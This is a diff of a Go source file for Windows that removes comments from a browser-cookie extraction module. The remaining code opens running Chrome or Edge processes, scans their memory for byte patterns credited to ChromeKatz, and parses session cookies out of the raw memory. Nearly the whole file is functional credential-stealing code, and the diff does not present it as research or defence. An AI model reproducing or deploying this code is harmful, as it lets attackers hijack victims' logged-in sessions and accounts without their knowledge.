@@ -1,5 +1,4 @@
 //go:build windows
-// +build windows
 
 package cookies
 
@@ -14,7 +13,6 @@ import (
 	"golang.org/x/sys/windows"
 )
 
-// CanonicalCookie structures for different Chrome versions
 type CanonicalCookieChrome struct {
 	Name         [200]byte
 	Value        [4096]byte
@@ -44,7 +42,6 @@ type CanonicalCookieEdge struct {
 	HttpOnly     bool
 }
 
-// CookiePattern contains multiple patterns for different Chrome versions (ChromeKatz-style)
 type CookiePattern struct {
 	Pattern  []byte
 	Offset   int
@@ -53,9 +50,8 @@ type CookiePattern struct {
 	VVersion string
 }
 
-// CookiePatterns holds all known patterns from ChromeKatz research
 var CookiePatterns = []CookiePattern{
-	// Chrome v120+ pattern
+
 	{
 		Pattern:  []byte{0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x41, 0x56, 0x41, 0x57},
 		Offset:   0,
@@ -63,7 +59,7 @@ var CookiePatterns = []CookiePattern{
 		MaxGap:   500,
 		VVersion: "v120+",
 	},
-	// Edge pattern
+
 	{
 		Pattern:  []byte{0x48, 0x85, 0xC0, 0x74, 0x15, 0x8B, 0x48, 0x08},
 		Offset:   0,
@@ -73,20 +69,17 @@ var CookiePatterns = []CookiePattern{
 	},
 }
 
-// ProcessMemoryExtractor handles memory-based cookie extraction
 type ProcessMemoryExtractor struct {
 	processHandle windows.Handle
 	processID     uint32
 	baseAddress   uintptr
 }
 
-// FindChromeProcess finds the first available Chrome process
 func FindChromeProcess() (uint32, error) {
 	if runtime.GOOS != "windows" {
 		return 0, fmt.Errorf("memory extraction only supported on Windows")
 	}
 
-	// Find Chrome process using Windows API
 	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
 		return 0, err
@@ -114,7 +107,6 @@ func FindChromeProcess() (uint32, error) {
 	return 0, fmt.Errorf("no Chrome/Edge process found")
 }
 
-// NewMemoryExtractor creates a new memory extractor for a process
 func NewMemoryExtractor(processID uint32) (*ProcessMemoryExtractor, error) {
 	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, processID)
 	if err != nil {
@@ -128,12 +120,10 @@ func NewMemoryExtractor(processID uint32) (*ProcessMemoryExtractor, error) {
 	}, nil
 }
 
-// Close closes the process handle
 func (pe *ProcessMemoryExtractor) Close() error {
 	return windows.CloseHandle(pe.processHandle)
 }
 
-// GetModuleBaseAddress gets the base address of a module in the process
 func (pe *ProcessMemoryExtractor) GetModuleBaseAddress(moduleName string) (uintptr, error) {
 	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPMODULE, pe.processID)
 	if err != nil {
@@ -163,12 +153,11 @@ func (pe *ProcessMemoryExtractor) GetModuleBaseAddress(moduleName string) (uintp
 	return 0, fmt.Errorf("module %s not found", moduleName)
 }
 
-// SearchPatternInMemory searches for a pattern in process memory
 func (pe *ProcessMemoryExtractor) SearchPatternInMemory(pattern []byte) []uintptr {
 	var matches []uintptr
 	var mvi windows.MemoryBasicInformation
 
-	currentAddr := uintptr(0x400000) // Start from typical user-mode space
+	currentAddr := uintptr(0x400000)
 
 	for currentAddr < uintptr(0x7FFFFFFF0000) {
 		err := windows.VirtualQueryEx(pe.processHandle, currentAddr, &mvi, unsafe.Sizeof(mvi))
@@ -177,13 +166,11 @@ func (pe *ProcessMemoryExtractor) SearchPatternInMemory(pattern []byte) []uintpt
 			continue
 		}
 
-		// Only read committed memory
 		if mvi.State != windows.MEM_COMMIT {
 			currentAddr += mvi.RegionSize
 			continue
 		}
 
-		// Try to read this memory region
 		buffer := make([]byte, mvi.RegionSize)
 		var nRead uintptr
 		err = windows.ReadProcessMemory(pe.processHandle, currentAddr, &buffer[0], uintptr(len(buffer)), &nRead)
@@ -192,7 +179,6 @@ func (pe *ProcessMemoryExtractor) SearchPatternInMemory(pattern []byte) []uintpt
 			continue
 		}
 
-		// Search for pattern in this buffer
 		for i := 0; i < len(buffer)-len(pattern); i++ {
 			if matchPattern(buffer[i:i+len(pattern)], pattern) {
 				matches = append(matches, currentAddr+uintptr(i))
@@ -205,7 +191,6 @@ func (pe *ProcessMemoryExtractor) SearchPatternInMemory(pattern []byte) []uintpt
 	return matches
 }
 
-// matchPattern matches a byte pattern with advanced validation (ChromeKatz-inspired)
 func matchPattern(data, pattern []byte) bool {
 	if len(data) < len(pattern) {
 		return false
@@ -218,13 +203,11 @@ func matchPattern(data, pattern []byte) bool {
 	return true
 }
 
-// validateCookieStructure checks if extracted data looks like a valid cookie
 func validateCookieStructure(buffer []byte, startOffset int) bool {
 	if len(buffer)-startOffset < 500 {
 		return false
 	}
 
-	// Check for reasonable string lengths
 	nameLen := extractStringLen(buffer, startOffset)
 	if nameLen > 1000 || nameLen < 1 {
 		return false
@@ -235,7 +218,6 @@ func validateCookieStructure(buffer []byte, startOffset int) bool {
 		return false
 	}
 
-	// Look for timestamp patterns (Chrome uses Windows FILETIME format)
 	timestamp := binary.LittleEndian.Uint64(buffer[startOffset+200 : startOffset+208])
 	if timestamp > 0 && timestamp < 0xFFFFFFFFFFFFFF00 {
 		return true
@@ -244,12 +226,11 @@ func validateCookieStructure(buffer []byte, startOffset int) bool {
 	return false
 }
 
-// extractStringLen tries to determine string length from buffer prefix
 func extractStringLen(buffer []byte, offset int) int {
 	if offset+4 > len(buffer) {
 		return -1
 	}
-	// Try length prefix
+
 	length := binary.LittleEndian.Uint32(buffer[offset : offset+4])
 	if length > 0 && length < 5000 {
 		return int(length)
@@ -257,7 +238,6 @@ func extractStringLen(buffer []byte, offset int) int {
 	return -1
 }
 
-// extractString safely extracts a null-terminated or length-prefixed string
 func extractString(buffer []byte, offset, maxLen int) string {
 	if offset >= len(buffer) {
 		return ""
@@ -268,11 +248,10 @@ func extractString(buffer []byte, offset, maxLen int) string {
 		end = len(buffer)
 	}
 
-	// Try to find null terminator (ASCII)
 	for i := offset; i < end; i++ {
 		if buffer[i] == 0 {
 			text := buffer[offset:i]
-			// Filter to printable ASCII
+
 			var result strings.Builder
 			for _, b := range text {
 				if b >= 32 && b <= 126 {
@@ -283,7 +262,6 @@ func extractString(buffer []byte, offset, maxLen int) string {
 		}
 	}
 
-	// Fallback: return as-is with filtering
 	var result strings.Builder
 	for i := offset; i < end; i++ {
 		if buffer[i] >= 32 && buffer[i] <= 126 {
@@ -295,9 +273,8 @@ func extractString(buffer []byte, offset, maxLen int) string {
 	return result.String()
 }
 
-// ReadCookieFromMemory reads a cookie structure from process memory with enhanced parsing
 func (pe *ProcessMemoryExtractor) ReadCookieFromMemory(addr uintptr) (*BrowserCookie, error) {
-	buffer := make([]byte, 16384) // Larger buffer for better parsing
+	buffer := make([]byte, 16384)
 	var nRead uintptr
 
 	err := windows.ReadProcessMemory(pe.processHandle, addr, &buffer[0], uintptr(len(buffer)), &nRead)
@@ -305,35 +282,26 @@ func (pe *ProcessMemoryExtractor) ReadCookieFromMemory(addr uintptr) (*BrowserCo
 		return nil, fmt.Errorf("failed to read memory at %x", addr)
 	}
 
-	// Validate structure before parsing
 	if !validateCookieStructure(buffer, 0) {
 		return nil, fmt.Errorf("invalid cookie structure at %x", addr)
 	}
 
 	cookie := &BrowserCookie{}
 
-	// Advanced parsing with offset-based field extraction (ChromeKatz-inspired)
-	// Offsets based on CanonicalCookie structure analysis
-
-	// Parse Name (offset ~0, max 200 bytes)
 	cookie.Name = extractString(buffer, 0, 200)
 
-	// Parse Value (offset ~200, max 4096 bytes) - usually encrypted
 	valueBytes := extractString(buffer, 200, 4096)
 	if len(valueBytes) > 0 {
 		cookie.Value = valueBytes
 	}
 
-	// Parse Domain (offset ~4300, max 256 bytes)
 	cookie.Host = extractString(buffer, 4300, 256)
 
-	// Parse Path (offset ~4600, max 256 bytes)
 	pathStr := extractString(buffer, 4600, 256)
 	if len(pathStr) > 0 {
 		cookie.Path = pathStr
 	}
 
-	// Parse Flags (Secure, HttpOnly, etc. around offset ~4900)
 	if len(buffer) > 4904 {
 		secure := buffer[4900]
 		httpOnly := buffer[4901]
@@ -341,7 +309,6 @@ func (pe *ProcessMemoryExtractor) ReadCookieFromMemory(addr uintptr) (*BrowserCo
 		cookie.HttpOnly = httpOnly != 0
 	}
 
-	// Parse timestamps (int64 values around offset ~4912+)
 	if len(buffer) > 4928 {
 		expiryTs := binary.LittleEndian.Uint64(buffer[4912:4920])
 		if expiryTs > 0 {
@@ -352,13 +319,11 @@ func (pe *ProcessMemoryExtractor) ReadCookieFromMemory(addr uintptr) (*BrowserCo
 	return cookie, nil
 }
 
-// improvePatternSearchWithHeuristics uses multiple strategies for pattern location (ChromeKatz enhancement)
 func (pe *ProcessMemoryExtractor) improvePatternSearchWithHeuristics(pattern []byte) []uintptr {
 	matches := pe.SearchPatternInMemory(pattern)
 
 	if len(matches) == 0 {
-		// Try alternative pattern - look for structures with specific field markers
-		// Search for addresses pointing to heap memory typical for string data
+
 		altMatches := pe.searchStructureHeuristics()
 		matches = append(matches, altMatches...)
 	}
@@ -366,14 +331,13 @@ func (pe *ProcessMemoryExtractor) improvePatternSearchWithHeuristics(pattern []b
 	return matches
 }
 
-// searchStructureHeuristics uses heuristic-based searching for cookie structures
 func (pe *ProcessMemoryExtractor) searchStructureHeuristics() []uintptr {
 	var matches []uintptr
 	var mvi windows.MemoryBasicInformation
 
 	currentAddr := uintptr(0x400000)
 	foundCount := 0
-	maxMatches := 50 // Limit to avoid false positives
+	maxMatches := 50
 
 	for currentAddr < uintptr(0x7FFFFFFF0000) && foundCount < maxMatches {
 		err := windows.VirtualQueryEx(pe.processHandle, currentAddr, &mvi, unsafe.Sizeof(mvi))
@@ -395,13 +359,12 @@ func (pe *ProcessMemoryExtractor) searchStructureHeuristics() []uintptr {
 			continue
 		}
 
-		// Look for pointer-like values followed by size fields (common in C++ objects)
 		for i := 0; i < len(buffer)-16; i += 8 {
-			// Check for typical heap pointer pattern followed by size
+
 			size := binary.LittleEndian.Uint32(buffer[i : i+4])
 			if size > 10 && size < 10000 {
 				ptr := binary.LittleEndian.Uint64(buffer[i+8 : i+16])
-				// Pointer should be in valid heap range
+
 				if ptr > 0x10000 && ptr < 0x7FFFFFFF0000 {
 					matches = append(matches, currentAddr+uintptr(i))
 					foundCount++
@@ -418,19 +381,16 @@ func (pe *ProcessMemoryExtractor) searchStructureHeuristics() []uintptr {
 	return matches
 }
 
-// ExtractCookiesFromMemory extracts cookies from a running Chrome process with enhanced ChromeKatz techniques
 func ExtractCookiesFromMemory() ([]BrowserCookie, error) {
 	if runtime.GOOS != "windows" {
 		return nil, fmt.Errorf("memory extraction only available on Windows")
 	}
 
-	// Find Chrome process
 	pid, err := FindChromeProcess()
 	if err != nil {
 		return nil, err
 	}
 
-	// Open process
 	extractor, err := NewMemoryExtractor(pid)
 	if err != nil {
 		return nil, err
@@ -439,30 +399,28 @@ func ExtractCookiesFromMemory() ([]BrowserCookie, error) {
 
 	var cookies []BrowserCookie
 
-	// Try multiple patterns (ChromeKatz-inspired multi-version support)
 	patterns := [][]byte{
-		// Chrome v120+ pattern (primary)
+
 		{
 			0xAA, 0xAA, 0xAA, 0xAA, 0xCC, 0xCC, 0xCC, 0xCC, 0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB,
 			0xAA, 0xAA, 0xAA, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB, 0xAA, 0xAA, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00,
 		},
-		// Alternative pattern for older Chrome versions
+
 		{
 			0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x28,
 		},
-		// Edge pattern variant
+
 		{
 			0x48, 0x85, 0xC0, 0x74, 0x15, 0x8B, 0x48, 0x08, 0x83, 0xE1, 0x01,
 		},
 	}
 
-	// Search with each pattern
 	for _, pattern := range patterns {
 		matches := extractor.SearchPatternInMemory(pattern)
 
 		for _, addr := range matches {
 			if cookie, err := extractor.ReadCookieFromMemory(addr); err == nil {
-				// Filter duplicates
+
 				if !cookieExists(cookies, cookie) {
 					cookies = append(cookies, *cookie)
 				}
@@ -470,7 +428,6 @@ func ExtractCookiesFromMemory() ([]BrowserCookie, error) {
 		}
 	}
 
-	// If patterns didn't find enough cookies, try heuristic approach
 	if len(cookies) < 10 {
 		heuristicMatches := extractor.improvePatternSearchWithHeuristics(patterns[0])
 		for _, addr := range heuristicMatches {
@@ -489,7 +446,6 @@ func ExtractCookiesFromMemory() ([]BrowserCookie, error) {
 	return cookies, nil
 }
 
-// cookieExists checks if a cookie already exists in the list (deduplication)
 func cookieExists(cookies []BrowserCookie, newCookie *BrowserCookie) bool {
 	for _, c := range cookies {
 		if c.Name == newCookie.Name && c.Host == newCookie.Host && c.Value == newCookie.Value {
@@ -499,7 +455,6 @@ func cookieExists(cookies []BrowserCookie, newCookie *BrowserCookie) bool {
 	return false
 }
 
-// ListChromeProcesses lists all available Chrome/Edge processes
 func ListChromeProcesses() ([]map[string]interface{}, error) {
 	var processes []map[string]interface{}
 
